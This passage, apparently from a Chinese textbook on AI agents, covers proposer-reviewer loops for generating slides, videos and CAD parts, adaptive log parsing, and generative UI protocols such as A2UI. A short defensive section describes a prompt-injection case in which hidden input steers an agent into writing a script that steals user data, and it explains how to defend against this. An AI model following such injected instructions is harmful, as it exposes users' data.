迭代与终止条件是原文特意点出的 Loop 工程细节。Proposer 接收反馈后理解意图并修改代码，新版本再次提交 Reviewer 审查，迭代直到质量达标或达到最大迭代次数（如 5 轮）。「质量达标」是目标型终止，由审核者（有视觉的那个角色）判定「可以了」，这是理想情况；「最大轮数」是预算型终止，不管效果如何，跑到第 5 轮就停，这是保底。两者必须同时存在。只有目标型终止，如果审核者永远不满意（比如它的标准自相矛盾），循环就永远跑下去；只有预算型终止，你会在质量还没达标时就交付。「目标 + 预算」这个双子句结构，是所有 Agent 循环都应该有的终止设计。

与第四章的提议者-审核者模式的关系，原文做了明确的同异对比。相同点是同属第一章命名的提议者-审核者模式，生成与审查分离、双模型独立评估，用 Loop 工程的语言说就是「制造者」与「验证者」分离的子 Agent。差异在目标与形态：第四章把它用于不可逆操作的安全审查，审核者对单次操作给出批准或否决；本章把它用于内容质量的迭代改进，是多轮循环，并且审核者接触到提议者看不到的新信息（渲染结果）。核心设计原则一脉相承：共享目标约束、使用不同模型家族降低同类错误概率、反馈作为特殊事件加入 Proposer 轨迹。

「反馈作为特殊事件」这个要点容易读过去，但它很重要。意思是不要把 Reviewer 的建议当成普通的用户消息或工具结果塞进去，而应该作为一种有明确语义标记的特殊事件。这样模型能清楚地知道「这是对我上一版作品的批评」，不会误当成「这是新的用户需求」，两者的处理方式完全不同，前者要修改，后者要重新做。这也呼应了第二、四章反复强调的结构化消息格式原则。

采用双 Agent 分工而非单 Agent 循环，核心优势在上下文管理：Reviewer 每次只处理最新版本的渲染图片，不受历史版本干扰；Proposer 仅累积结构化文本反馈，token 消耗少且更易于推理。单 Agent 方案则需要在同一上下文中累积数十页渲染图片的多轮迭代，上下文迅速超限。原文交代这一机制会在后续的视频编辑和日志可视化实验中重复使用，第十章将进一步探讨提议者-审核者之外的其他多 Agent 协作模式。

#### 实验 5-6 ★★：基于论文的 PPT 自动生成

实验目标是从学术论文自动生成高质量演示文稿，验证提议者-审核者机制在内容创作质量控制中的有效性。技术方案使用 Slidev 框架：Proposer Agent 阅读论文 PDF，提取章节结构、核心论点和图表，规划 PPT 结构，逐页生成 Slidev 代码；关键步骤是 Reviewer Agent 渲染每页截图，用 Vision LLM 检查渲染效果，识别文字溢出、内容拥挤、图片尺寸不当等问题，生成结构化改进建议，迭代直到效果达标。验收要求生成 10-20 页 PPT，覆盖论文主要贡献，至少包含 3 张原文图表且与文字说明匹配，渲染无文字溢出、布局合理；还要对比单 Agent 自我审查与提议者-审核者分工在上下文消耗和生成质量方面的差异。

#### 实验 5-7 ★★：论文讲解视频的自动生成

实验目标是把 PPT 生成能力扩展到视觉和听觉通道，实现视频讲解自动生成。技术在实验 5-6 的流程上加两步：Agent 同时生成每页的口语化讲解文字（引导性叙述，不复述原文），调用 TTS（文本转语音）合成语音，用 ffmpeg 把 PPT 截图与音频同步合成视频。验收要求视频 5-15 分钟，每页展示时间与语音时长精确匹配，讲解内容与视觉元素呼应。

图 5-6（原文插图，题为「论文到讲解视频的端到端流水线」）分两个阶段展开。阶段一是 PPT 生成（Proposer-Reviewer）：PDF 输入（`paper.pdf` → 解析章节结构 → 提取图表引用）→ 内容规划（10-20 页结构 → 核心论点提取 → 图表分配到页）→ Slidev 生成（逐页生成代码、`layout: two-cols`、代码与图片混排）→ 渲染检查（`export --per-slide`、Vision LLM 审查、溢出与拥挤检测）→ 迭代修复（Reviewer 回给 Proposer、修改 Slidev 代码、重新渲染验证）→ PPT 完成。阶段二是视频合成：逐页截图（`slide-01.png`、`slide-02.png` …）→ 讲解稿生成（LLM 逐页生成口语化讲解文字，引导性叙述）→ TTS 合成（文字转语音，`speech-01.mp3`、`speech-02.mp3`）→ 音画同步（ffmpeg 合成，截图时长等于音频时长，加转场效果）→ 最终视频（`output.mp4`，5-15 分钟，视觉与听觉双通道）。图底部并列了三条验收标准：PPT 是 10-20 页、覆盖主要贡献、至少 3 张原图表；渲染是零文字溢出、布局合理、图文匹配；视频是 5-15 分钟、音画同步、叙述连贯。

视频编辑是同一套思路的另一个落点。用通用 Computer Use 做视频编辑会碰到根本挑战：视频剪辑软件的 GUI 极其复杂，包含大量时间轴、图层、效果面板，Agent 需要精确定位这些界面元素并通过鼠标键盘操作完成编辑，精确输出坐标非常困难。把视频编辑重构为 API 调用和代码生成问题，复杂度就大幅下降。许多专业软件提供了程序化 API 接口，以结构化、可组合的方式暴露核心功能，原文给了两个例子：Blender，开源的 3D 创作与视频合成工具，支持 Python 脚本控制；FFmpeg，音视频处理领域的命令行瑞士军刀。Blender Python API 允许通过代码精确控制视频片段的导入、裁剪、排列、过渡效果、音频混合，每个操作对应一个清晰的函数调用。对 Agent 而言，把自然语言需求转化为 API 调用，远比理解 GUI 界面并模拟鼠标点击容易得多。视频编辑同样采用提议者-审核者机制：Proposer Agent 生成 Blender 脚本，Reviewer Agent 渲染关键帧并用 Vision LLM 检查效果，反馈修改建议。

#### 实验 5-8 ★★：基于 API 的智能视频剪辑

实验目标是验证 Agent 通过生成 Blender Python API 代码实现视频编辑的能力，评估基于视觉反馈的提议者-审核者机制在多媒体内容处理中的作用。核心挑战原文单独列出：理解用户的自然语言编辑需求并转化为精确的 API 调用序列，处理多种编辑操作（剪辑、合并、字幕、音轨混合、视觉效果），确保生成的 Python 脚本正确执行；Proposer Agent 编写代码后无法直接判断视频效果，必须通过 Reviewer Agent 渲染并利用 Vision LLM 检查关键帧。

技术方案上，用户提供视频素材（如包含冲浪、徒步、滑雪等场景的原始素材）并以自然语言描述需求（如「把冲浪部分剪出来」）。Proposer Agent 调用视频分析子 Agent，采用两步定位策略。第一步是粗粒度定位：调用子 Agent 时传入视频路径、每 10 秒截图间隔、目标问题，子 Agent 用 ffmpeg 截取关键帧，将所有截图连同问题输入 Vision LLM，返回场景区间（如「冲浪在第 40-110 秒」）。第二步是精细粒度定位：缩小时间范围，以每秒一张的密度截图，再次调用子 Agent，精确定位边界时间点。把视频分析封装成子 Agent 的用意是避免大量截图占用主 Agent 上下文。定位完成后生成 Blender API 脚本，Reviewer Agent 执行快速预览，检查关键帧并反馈修改建议，迭代直到达标再完整渲染。

验收标准要求 Agent 能准确识别视频中不同场景，根据自然语言指令正确生成剪辑脚本；起始和结束点位置准确，误差不超过 3 秒；指令包含特效要求（慢动作、转场、字幕）时生成的视频要正确应用效果；Reviewer Agent 能检测出遗漏关键内容、包含无关片段这类明显错误并触发修正；最终输出视频文件格式正确、画质符合预期。

两步定位这个技巧值得单独拆开看，因为把全部截图喂给 Vision LLM 是不现实的，一段 5 分钟视频按每秒一帧就有 300 张图。粗定位每 10 秒截一帧，300 秒的视频只有 30 张图，全部喂给 Vision LLM 问「冲浪在第几秒到第几秒」，精度只有 ±10 秒，但成本低、能快速排除掉绝大部分时间范围；精定位把范围缩到那一段（比如 40-110 秒），改成每秒一张（70 张图），再问一次，得到精确边界（误差 ±1 秒）。本质上是先用低分辨率扫全图缩小搜索空间，再用高分辨率精确定位，这跟 5.1.7 讲的搜索策略（先用语义搜索找到相关模块、再用正则精确定位）是同一个思路，只不过作用的对象从「代码库」换成了「时间轴」。整个视频分析被封装成子 Agent，也正是「上下文隔离」手法在多媒体场景的又一次复用。

误差不超过 3 秒这个验收标准说明视频剪辑对精度的要求其实不算极端，3 秒相对于 40-110 秒的场景区间是约 4% 的误差，这也印证了两步定位的精度分配是合理的：粗定位的 ±10 秒排除掉大部分范围，精定位的 ±1 秒已经远优于要求的 ±3 秒。

3D 与工业零件这一节把「元能力的适用边界」讨论得最清楚。同样是「生成一个东西」，Agent 面前有两条路：一条是写代码精确构造（CadQuery、OpenSCAD、Blender API），另一条是直接调用 3D 生成模型（混元 3D 这类 text/image-to-3D 模型，和文生图同属 diffusion 一系）。很多人纠结到底什么时候该用代码生成，什么时候该用图片或 3D 生成模型，原文给了两条判据。

一看产物有没有紧凑的精确描述。工业零件天然有紧凑的精确描述：一个法兰盘，外径、厚度、孔位圆直径、孔径、孔数，五六个参数就完整定义了，代码是它的无损表达。反例是一盆绿植、一块太湖石、一张人脸，它们有数不清的细节，内在复杂度是近乎无限的。二看精度要求和可验证性。零件的每个尺寸都是硬约束，孔径 5mm、公差 ±0.05mm，差一丝就是废品；代码生成的零件可以程序化验证，载入网格，量出外径、孔位，跟规格逐项对一遍，而 3D 生成模型生成的零件无法直接跟规格核对。

还有第三个更实际的差别：表示形式和可编辑性。制造流程要的是 B-rep（边界表示）参数化实体，STEP 文件里存着特征树和尺寸参数，可以直接驱动 CNC 加工；3D 生成模型吐出来的则是三角面片网格，曲面靠无数细碎面片逼近，放大看坑坑洼洼。等甲方说一句「安装孔从 M5 改成 M6」，差别就见分晓了：代码路线改一个数字重跑一遍，其余尺寸分毫不差；生成模型路线只能整个重新生成，别的尺寸会不会跟着跑偏，全凭运气。

所以走哪条路本身就是 Agent 要做的一次决策：掂量产物的内在复杂度和精度要求，把任务分给代码生成或者 3D 生成模型。实际系统里两条路还可以混着走，几何体用代码参数化生成，表面纹理交给生成模型，各取所长。

两条判据可以合成一句可操作的话：产物能不能被少数几个参数完整描述？能（法兰盘：外径、厚度、孔位圆直径、孔径、孔数），代码就是无损表达，用代码；不能（绿植、太湖石、人脸），参数化表达必然有损，就该用生成模型。原文用的词是「内在复杂度」，注意它说的是产物本身的复杂度，不是任务的难度。

可编辑性这一条是判据里最容易被低估的。代码路线的修改是局部且确定的，改一个数字，其余尺寸分毫不差；生成模型路线的「修改」实际上是重新生成，因为模型没有「参数」这个概念，它只有一次采样，所以其余尺寸会不会跟着变全凭运气。这引出一个更深的区别：代码路线下，产物是「规格的函数」，你改规格，产物按确定的方式跟着变；生成模型路线下，产物是一次采样的结果，它和输入规格之间没有可微、可逆的关系。对需要反复迭代修改的真实工业流程来说，这个区别是决定性的。

关于 B-rep 参数化实体与三角面片网格，这是制造业最看重的区别。STEP 文件保存的是特征树和尺寸参数，比如「这是一个圆柱，直径 80，高 10」，因此可以直接驱动 CNC 加工，机床需要的是几何定义和刀具路径，不是一堆三角形；三角面片网格保存的是逼近曲面的无数小三角形，放大看是坑坑洼洼的多面体，丢失了「这是一个圆柱」这个语义，无法直接参与参数化制造。原文说的「放大看坑坑洼洼」，讲的正是这个逼近误差。

两条路混着走的建议很实用，它把两条判据分别应用在同一个对象的不同部分上：一个零件的几何有紧凑的精确描述，用代码；它的表面纹理没有紧凑的精确描述，用生成模型。判断依据仍然是「这部分有没有紧凑的精确描述、精度要求高不高」，只不过现在把「产物」拆成了「几何」和「纹理」两个部分分别判断。这也是工程上最常见的落地方式。

#### 实验 5-9 ★★：同一个零件的两种生成路线——代码与生成模型

实验目标是拿同一个带尺寸规格的机械零件，对比代码生成与 3D 生成模型两条路线在尺寸精度、可编辑性和制造可用性上的差异，验证「按内在复杂度与精度要求选路」的判断框架。技术方案从带明确规格的自然语言需求出发，比如「法兰盘，外径 80mm，厚度 10mm，4 个均布 M5 安装孔，孔位圆直径 60mm」。路线 A 是 Agent 编写 CadQuery（或 OpenSCAD）代码构造零件，导出 STEP 与 STL；路线 B 是把同一规格交给 3D 生成模型（如混元 3D），得到三角面片网格。程序化验证的环节是测量两条路线产物的关键尺寸（外径、厚度、孔位、孔径）与规格的偏差，并检查安装面的平整度。随后发出变更请求「安装孔从 M5 改为 M6」，记录两条路线各自的修改成本：代码路线改一个参数重新运行，生成模型路线只能整体重新生成，其余尺寸是否保持不变无法保证。对照组是生成一盆绿植，两条路线的优劣正好反转，代码路线即便加入程序化噪声也僵硬呆板，生成模型路线则自然生动。

几组概念对照也在这里理清。本章的 Proposer-Reviewer 与第四章的同名模式，相同点在生成与审查分离、双模型独立评估、共享目标约束、使用不同模型家族、反馈作为特殊事件，差异在第四章用于不可逆操作的安全审查、审核者对单次操作批准或否决，本章用于内容质量的迭代改进、是多轮循环，且审核者接触到提议者看不到的新信息。代码生成与生成模型这一对，前者是参数化的、确定的、可编辑的、可程序化验证的，后者（diffusion 一系）是采样的、不可精确控制的、只能整体重生成的，选路依据是产物的内在复杂度和精度要求。

B-rep/STEP 与三角面片网格/STL 是参数化实体与网格逼近两种表示，实验 5-9 里路线 A 导出的是 STEP 与 STL，路线 B 只能得到网格，这个差别直接决定了「可编辑性」那一项的胜负。TTS（文本转语音）与 Vision LLM 都是多模态模型，方向相反：TTS 在输出侧，把文字变成语音，用在实验 5-7 生成讲解音频；Vision LLM 在输入侧，把图片读成理解，用在 PPT 和视频的渲染审查。PPT 生成流程里两者都出现，Vision LLM 审图，TTS 配音。两步定位里的粗粒度与精细粒度用的是同一个子 Agent、同一个 Vision LLM，区别只在截图密度（每 10 秒一张对每秒一张）和搜索范围（全视频对上一轮返回的区间），粗粒度负责缩小搜索空间，精粒度负责确定精确边界，顺序不能颠倒，否则就得在全视频上做每秒一帧的昂贵采样。

### 5.2.4 代码作为系统适配器

前几节的代码大多产出「面向人」的东西，报告、幻灯片、界面。这一节的代码指向另一个方向：连接机器与机器。真实系统里，Agent 要打交道的外部服务常常没有现成 SDK，接口也未必规范，文档缺失、返回格式非标准、字段随版本漂移都是常态。面对这种情况，Agent 不必等人预先写好适配层，而是当场阅读接口文档或直接观察一两条真实响应，即时生成适配代码，具体包括构造 HTTP 客户端、拼装鉴权头、解析非标准的返回结构、把上游的数据模型转换成下游可用的格式。代码在这里成了连接任意系统的「万能胶」，哪里接不上，就现场生成一段胶水补上，这正是元能力「系统接口」方向的核心。下面要展开的日志自适应解析，是这一能力在可观测性场景下的具体化：面对不断演化的日志格式，Agent 同样靠现场生成解析代码来适配。

「万能胶」还能延伸到完全没有 API 的系统。当外部系统只暴露图形界面时，Agent 可以先通过 Computer Use（第六章将详细介绍）操作界面，再把成功完成的操作序列用代码固化为 RPA 工具，未来执行相同任务时直接运行代码，以极高的速度和稳定性完成操作，无需再调用昂贵的视觉思考。RPA 可以说是「系统适配器」在无接口系统上的极端形态，这种工作流录制与固化机制将在第九章展开。

RPA 这个判断值得琢磨。当外部系统连 API 都没有（只有 GUI）时，先让 Computer Use 走一遍，慢、贵、但通用，然后把成功的那条操作序列固化成代码，快、便宜、稳定。这里的代码不是对 API 的封装，而是对「鼠标键盘操作序列」的封装，比如「先点这个按钮，再在输入框里输这个，再按回车」。原文说这样「无需再调用昂贵的视觉思考」，这才是关键收益：把一次昂贵的、需要视觉推理的操作，转化为一次廉价的、纯代码的执行。这也回到了 5.1.2 的结论：Computer Use 通用性最强但成本、延迟、稳定性最差，所以正确用法是用它探路，用代码固化。

「观察真实响应」这个手法可以推广成一个通用的适配方法论。遇到一个不熟悉的接口，先手工（或用最粗的方式）打一次请求，把原始响应拿下来，然后基于这份真实样本生成解析代码。好处是解析代码一写完就能在真实样本上验证，正对应原文说的「基于样本数据临时生成解析代码」。读文档当然也可以，但文档经常是过时的，真实响应是当前的事实。下面讲日志解析时用的是同一套，「失败信息（原始日志样本、详细报错）」就是生成解析代码的输入。样本在这个方法里是核心资产。

数据处理的根本痛点在于数据格式的多样性和不断变化。数据处理是软件系统中最常见但也最令人头疼的任务之一，同一系统在演化过程中可能多次修改数据格式，添加新字段、改变嵌套结构、引入新类型。为每种格式手写解析代码的维护成本极高，每次格式修改都需要更新解析逻辑、测试兼容性、部署新版本。原文给出的全新思路是让 Agent 在遇到新格式时基于样本数据临时生成解析代码，系统自动适应数据格式的演化，无需人工干预。

日志解析和可视化这一块，需求本身来自可观测性：Agent 系统的可观测性依赖于对执行流程的可视化。一个复杂的 Agent 任务可能包含数百步操作，涉及多次 LLM 调用、数十次工具执行、多次子 Agent 交互。可视化这些数据面临多重挑战：不同工具返回不同结构的数据，格式随系统迭代不断演化；一个完整轨迹可能包含数十万字符，需要在概览和细节之间找到平衡。代码生成给出的方案是建立一个自动修复的反馈循环：当前端遇到无法解析的日志格式时，不是显示错误，而是自动将失败信息（原始日志样本、详细报错）报告给 Agent，Agent 分析样本数据结构，生成能正确解析的前端代码，代码先在虚拟浏览器中自动测试（验证解析正确性，用 Vision LLM 检查可视化效果），通过后热更新到前端系统。

这个场景特别适合「代码生成 + 自动修复循环」，因为它有明确的对错信号：解析成功还是失败，一试就知道。这就落在 5.1.4 表 5-1 里「目标明确 + 结果可自动验证」的最佳区域，所以这个场景的自动化是可行的。整个循环的角色分派也很干净：前端做检测器，解析失败就上报；Agent 做代码生成器；虚拟浏览器做验证器；前端又是部署目标。注意「虚拟浏览器中自动测试」这一步，它是在真正影响用户之前先验证一遍，而且验证有两个维度，解析正确性（代码层面，能不能把日志变成结构化数据）和可视化效果（视觉层面，用 Vision LLM 检查图表好不好看），这又是「提议者-审核者」思路的复用。

热更新是这条链路的关键一环。没有热更新，Agent 生成完代码还要走「提交 → 构建 → 部署 → 重启」的流程，周期可能是分钟到小时级；有了热更新，代码生成完立刻生效，整个「发现问题 → 修复」的闭环就在几秒内闭合。这跟 5.1.6「即时语法反馈」是同一个原理：反馈延迟越短，修复的成本越低、迭代的轮数越少。

#### 实验 5-10 ★★★：自适应的日志解析系统

实验目标是构建能自我进化的 Agent 日志可视化系统。技术方案是初始系统仅支持基本格式，前端检测解析失败后报告 Agent，Agent 生成解析代码，代码在虚拟浏览器中测试，通过后热更新部署，全流程自动化。验收标准是自动检测失败并触发学习，生成的代码通过自动测试，热更新后能正确解析新格式。

生产日志的自动分析和问题诊断是这条线的另一半。生产环境的 Agent 会产生大量轨迹日志（trajectory，记录每次任务的完整过程），从日志中识别问题、定位根因、构建测试用例是一项高成本的工作。原文把成本来源拆成三条：问题定位困难，因为任务失败可能由多个模块的协同错误导致；复现成本高，因为生产环境的复杂性难以在测试环境中模拟；已修复的问题容易反复出现，因为缺乏系统化的回归测试。

代码生成的自动化路径是这样：Agent 读取生产日志，结合架构文档和 PRD（产品需求文档）自动判断执行流程是否符合预期，定位有问题的环节和模块，再根据分析结果生成结构化问题报告（优先级、模块、描述、改进建议）和回归测试用例。关键在于测试用例的构造方式：用例引用问题轨迹 ID 和关键交互轮次，测试框架通过自动重放，验证修复后的系统在相同输入下能否产生正确行为。最后一步是闭环，Agent 通过 MCP 对接 GitHub，创建 Issue 并分配给相关开发者，完成从问题发现到任务分派的全自动化。

#### 实验 5-11 ★★★：生产日志的智能诊断系统

实验目标是从生产轨迹中自动发现问题、生成测试用例、创建工作项。技术方案是 Agent 读取生产环境的轨迹集合，结合系统架构文档和 PRD 进行分析，识别问题模式、定位涉及的模块，生成结构化问题报告（优先级、模块、描述、改进建议），自动生成回归测试用例（引用轨迹 ID 和交互轮次，由测试框架自动重放验证），再通过 MCP 对接 GitHub 自动创建 Issue。

这条流水线最值得学的是「从日志到回归测试」这一步。一般的日志分析止步于发现问题、生成报告、建个 Issue，这些产物都是文本，它们不会自动防止问题复发。这条流水线多做了一件事：把一次失败变成一个可重复执行的测试用例。做法很聪明，用例直接引用问题轨迹 ID 和关键交互轮次，测试框架通过重放来验证。引用轨迹是关键，它保证测试用例没有丢掉原始场景的上下文（用户说了什么、Agent 做了什么、工具返回了什么），因此重放才有意义。没有这个引用，人写测试用例时很容易把它简化成一个「看起来差不多」的场景，从而漏掉真正的触发条件。

整个闭环的终点是创建 Issue 并分配给开发者，这一步看似简单但不可省。前四步产出的东西（报告、测试用例）如果没人接手，就变成了另一个无人看的日志。通过 MCP 把 Issue 建到 GitHub 并带上 assignee，等于把 Agent 的发现接进了团队现有的工作流：它不需要团队改变自己的工作方式，不用去新系统看新面板，工作项出现在团队已经在用的地方。原文把这一步的价值概括为「完成从问题发现到任务分派的全自动化」，图 5-7 的总结句更直白：「将人工诊断成本从小时级降低到分钟级。」

图 5-7 里的示例（取消订单未告知原因）正好和 5.2.2 的 τ-bench 取消政策是同一个业务场景。这不是巧合，它说明这两个能力是配套的：5.2.2 用代码化校验防止错误发生，5.2.4 用日志诊断发现已经发生的错误。前者是守门员，后者是巡检员。

最后几组对照值得分清。RPA 和 API 适配代码都是「用代码连上外部系统」，连的对象不同：API 适配代码连的是接口，构造 HTTP 请求、解析返回；RPA 固化的连的是界面操作序列，点哪里、输什么。RPA 用在完全没有 API 的极端情况，成本更高（依赖界面稳定性），稳定性更差，但覆盖面最广。

手写解析代码与现场生成解析代码的差别在成本位置上。前者写一次、固定下来，成本在初次开发；后者遇到新格式就生成一次，成本在每次生成。原文指出「为每种格式手写解析代码，维护成本极高」，因为格式会反复变，每次都要改代码、测兼容、重新部署；现场生成的价值是把这个维护成本转成一次模型调用。代价是生成的代码质量不如人写的稳定，所以需要自动测试这一环兜底。

自适应还有一个副作用值得警惕。原文在此没有展开，但思考题 3 明确提了出来：如果格式变化本身是一个 bug，而不是预期的格式演化，那么「自动适应」反而掩盖了问题。区别在于，预期的格式演化（比如新版本加了字段）应该被适应，非预期的格式变化（比如某个字段突然为空、结构被写坏）应该被报告为异常。

轨迹日志（trajectory）与普通应用日志不是一回事。轨迹日志记录的是 Agent 的完整执行过程，用户的每一句话、模型的每一次工具调用、工具的每一个返回，它的特点是结构化（有 role、tool_call、result 这些字段）且体量极大，原文说「一个完整轨迹可能包含数十万字符」；普通应用日志是文本行，体量小但语义弱。前者适合做「重放」，因为有完整的状态序列，后者不行。

### 5.2.5 代码作为生成式 UI

纯文本对话是传统 Agent 与用户打交道的主要方式，可文本是一条线性、单一的通道，放到很多场景里效率很低。原文点了三种典型情况：需要收集结构化信息时，反复问答把对话拖得又长又碎；需要呈现复杂数据关系时，纯文本的表达力顶不住；需要用户在若干选项里挑一个时，文本列表远不如可视化界面直观。代码生成给这些限制开了口子：Agent 可以动态生成表单、交互式图表，甚至完整的 Web 应用，把静态的文本对话升级成多模态交互。这种由 Agent 动态生成界面的模式，就叫**生成式 UI（Generative UI）**。

## A2UI 类协议：生成式 UI 的标准化

让 Agent 直接生成 HTML 和 JavaScript 来当界面，会立刻撞上一个根本性的安全问题：生成的代码可能包含恶意内容。原文举的场景是，如果有人在输入里藏了一段指令，Agent 就可能被提示注入操纵，在不知情的情况下生成一段窃取用户数据的脚本。

这里的因果要分清，原文的表述很精确：成因是提示注入，也就是恶意指令混进了 Agent 的输入；最终在浏览器里执行恶意脚本、窃取数据，这个效果类似传统 Web 的 XSS（Cross-Site Scripting，跨站脚本攻击）。但不能把整个攻击直接叫作 XSS，因为病灶不同，防御的位置也不同。按 XSS 的思路去防，你会做输入转义、上 CSP（内容安全策略），这些手段对「Agent 主动写出一段合法但恶意的脚本」帮助有限，那段脚本可能是完全合法的 JS，压根没有可转义的特殊字符；按提示注入的思路去防，落点是指令与内容的分离、工具权限的收窄，这才对得上病因。

以 **A2UI（Agent-to-User Interface）** 为代表的声明式界面协议给出了更安全的方向。Agent 不直接生成可执行的代码，只输出一份「界面描述清单」，JSON 格式，例如「请显示一个包含 3 行 2 列的表格，标题是『销售数据』」。客户端拿到这份清单，用它自己预先备好的安全组件把界面渲染出来。原文的类比很贴切：这就像餐厅的菜单，顾客（Agent）只能点菜单上有的菜（预定义的组件），不能走进厨房自己做（执行任意代码）。

另一个常被混为一谈的是 AG-UI。它由 CopilotKit 提出，名字相近，但它是一种配套的事件/传输协议，负责把 Agent 的执行状态（消息、工具调用、状态补丁）流式推送到前端，本身并不描述界面，它甚至可以承载 A2UI 这样的界面载荷。所以两者的关系是互补而非同类，不应该并列为同一种「声明式界面协议」。一个方便记的说法：AG-UI 管的是「怎么把消息送过去」，A2UI 管的是「送过去的那条消息长什么样」。

这类协议的核心设计原则是安全优先。客户端维护一个受信任的组件目录，比如 Card、Button、TextField、Table，Agent 只能请求渲染目录里已有的组件，无法注入任意代码；客户端用自己的原生组件渲染，不去执行 Agent 生成的任意 HTML。原文补充说，这类协议通常还会支持两个特性：跨平台，同一份描述在 React、Flutter、原生应用中都能渲染；增量生成，用流式 JSONL 格式边接收边渲染。

适用边界也很清楚：声明式方法适用于标准化的交互场景（表单、表格、卡片），而高度定制化的需求，比如自定义可视化、游戏界面，直接生成代码仍然更灵活。下面几种模式就是这两条路各自的具体应用。

### 模式一：用 HTML 交付成果，取代 Markdown 汇报

生成式 UI 不只用在交互过程中，它也在改变 Agent 最终交付成果的形态。传统上 Agent 干完一项任务，往往产出一份 Markdown 汇报文档；但一页页翻读线性排布的 Markdown 其实并不好读。随着 Agent 生成前端代码的能力越来越强，越来越多的实践改为让它直接产出 HTML。

这条路有三个明显的优势。交互式演示，可以用可操作的形式直接演示系统是怎么运行的，用户往往一看就懂，胜过一大段文字描述。更好的数据可视化，用图表而非表格来呈现数据，还能构建交互式组件，让用户自行浏览、筛选、下钻到自己关心的细节。可持续完善的交付件，HTML 网站不必是任务结束时才一次性产出的死物，它可以在工作推进的过程中由 Agent 不断补充和完善。

原文以作者自己写论文的经历为例（原文脚注 3：笔者的研究项目网站见 https://01.me/research/ ，其中每个项目都配有一个持续更新的交互式网站）：他会为每个研究项目维护一个交互式网站，它既是最终的交付件，也是研究过程中的一份活文档，笔者会让 Agent 随着实验的推进持续更新它。这个网站至少承担三类作用。

最直接的一类是实验数据追溯：每一次实验的具体数据、所用的 prompt 以及 LLM 的原始回复，都能在网站上逐条查看。价值在于，把这些摊开来反而更容易发现数据构造、数据格式、数据分布上的问题，也更容易看出 LLM 的回复和 judge 的打分是否存在系统性偏差。

训练指标监控是第二类。把训练过程中的各条曲线直接列在网页上，方便随时确认模型的「内科」指标是否健康。原文借用了医学里「内科」的说法：**内科指标**指的是反映训练过程本身是否正常的内部信号，例如训练损失与验证损失、梯度范数、学习率、模型输出 token 时的困惑度（perplexity，衡量模型对自己生成内容的「把握」程度），以及强化学习中的奖励、KL 散度、策略熵等。它们跟任务准确率那类最终的结果指标不是一回事：正如体检时的各项生理指标之于一个人的外在表现，内科指标往往能更早地暴露出损失不收敛、梯度爆炸、训练崩溃等问题。

还有一类是运行原理展示：用可视化的方式把整个系统的运行原理呈现出来，让人一眼就能看清这个由 AI 搭起来的系统到底是什么结构。

内科指标这个概念值得单独记一下，它是个很好用的思维工具。任务准确率回答的是「最终好不好」，那些曲线回答的是「过程正不正常」。为什么一定要把它们画出来？因为它们是时间序列，而人眼对「曲线突然翘起来」「两条线开始分离」这类形状变化极其敏感，这是看数字表格看不出来的。原文说内科指标往往能更早地暴露出问题，关键就在这个「更早」上。

「用 HTML 交付取代 Markdown 汇报」这个趋势还可以多想一层。Markdown 汇报的麻烦在于它是线性的，要读的东西排在一条竖线上，没有交互，不能筛选，也不能下钻。HTML 交付件是可操作的，数据能筛选，图表能缩放，流程能点击演示。原文举的三类作用其实指向同一件事：这份 HTML 不只是结论的展示，它是研究过程的仪表盘。

#### 模式二：澄清用户意图

用户需求表达得模糊或不完整时，Agent 需要通过澄清问题来收集必要信息。OpenAI Deep Research 这类产品通常用文本问答，局限很明显。效率上，每个问题需要一轮对话，十个澄清点就是十轮交互；表达力上，某些问题之间存在依赖关系，比如「选择旅行目的地」会影响「交通方式」的可选项，纯文本很难表达这种级联关系。

换成代码生成，Agent 可以创建结构化的交互界面来替代文本问答。图 5-8 展示了动态表单生成流程，说明 Agent 如何把澄清问题转化为一次性填写的结构化界面。Agent 生成包含各种输入控件的 HTML 表单：文本框收集开放性信息，下拉菜单让用户在预定义选项中选择，复选框允许多选，日期选择器简化时间输入。再进一步，Agent 可以生成级联表单，通过 JavaScript 实现动态逻辑，选择某选项后自动显示或隐藏后续问题，并动态更新可选项。用户一次填完整张表单，不用多轮对话，还能清楚看到所有需要填写的信息以及问题之间的逻辑关系。

图 5-8（原文插图，题为「动态表单生成流程」）的流程可以读出这几步：

| 环节 | 图中的内容 |
| --- | --- |
| 用户输入 | 「我想订去北京的机票」 |
| LLM 分析 → 生成表单代码 | `<form id="clarify">` 内含 `<input type="text" name="from" label="出发城市"/>`、`<input type="date" name="depart" label="出发日"/>`、`<select name="type">` 含 `<option>单程</option>` 与 `<option>往返</option>` |
| 渲染后的表单界面 | 出发城市：上海；出发日期：2025-08-15；旅行类型：往返 ▾；返程日期：2025-08-22；[提交] |
| 结构化 JSON 返回 | `{"from": "上海", "depart": "2025-08-15", "type": "往返", "return": "2025-08-22"}` |
| 继续执行 | Agent 携带完整参数继续执行任务：`search_flights(from='上海', to='北京', depart='2025-08-15', ...)` |

图底部做了对比：文本问答要 10 轮对话（Q1: 从哪出发? A: 上海 / Q2: 几号? A: 8月15 / Q3: 单程还是往返? ...）；动态表单只要 1 次提交，所有信息一次收集完成，级联逻辑自动处理。图上还标注了两点：表单代码由 LLM 动态生成；级联逻辑是选「往返」时自动显示返程日期。

动态表单为什么比多轮文本问答好，原文给的论证是效率和表达力两条，其中第二条更本质。设想订机票这个例子：如果先问「单程还是往返」，再问「返程日期」，那么第二个问题要不要问，取决于第一个问题的答案；反过来，先问了「返程日期」才被告知是单程，这一轮就白问了。纯文本问答里，这种依赖关系只能靠多问一轮来实现，模型必须先拿到前一个答案，才能决定下一个问题。级联表单把依赖关系写进了 JavaScript：选「往返」就显示返程日期，选「单程」就隐藏，用户在本地就把这段逻辑走完了，不需要和服务端来回一轮。N 轮串行交互就这样被压成了 1 次并行填写。

#### 实验 5-12 ★★：动态表单生成的意图澄清系统

实验目标是验证 Agent 通过动态生成 HTML 表单澄清用户意图的能力。技术方案是让 Agent 分析用户请求，识别澄清点，生成含级联逻辑的表单代码；前端渲染，用户一次提交，Agent 解析 JSON 数据继续任务。验收标准是：用户输入「我想订一张去北京的机票」，Agent 生成的表单要包含出发城市（文本输入）、出发日期（日期选择器）、旅行类型（单选：单程/往返）、返程日期（仅选择「往返」时显示），用户一次提交完成所有信息。

#### 模式三：生成 SQL 查询

数据库查询是代码生成能显著提升交互体验的场景。传统的数据库访问要么依赖 GUI 工具，要么手写 SQL，前者操作繁琐，后者要求用户具备专业知识。Agent 可以把自然语言转为 SQL，但这里有一个关键的设计选择：是让 Agent 执行 SQL 之后用自然语言描述结果，还是让 Agent 生成 SQL 代码作为 artifact，交由前端直接执行？

